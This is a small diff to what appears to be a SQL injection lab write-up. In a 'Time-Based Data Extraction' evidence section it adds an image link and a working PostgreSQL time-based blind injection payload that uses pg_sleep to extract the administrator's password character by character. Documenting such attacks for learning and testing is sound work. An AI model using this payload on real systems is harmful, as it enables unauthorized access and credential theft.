@@ -594,7 +594,14 @@ Time-Based Data Extraction
 
 ## Evidence
 
-![Time Delay Data Extraction](images/time-delay-data.png)
+![Time Delay Data Extraction](/SQLI/time_delay.png)
+
+**Payload Used**
+
+```
+'|| (SELECT CASE WHEN SUBSTRING(password,1,1)='A' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'
+
+```
 
 ---
 
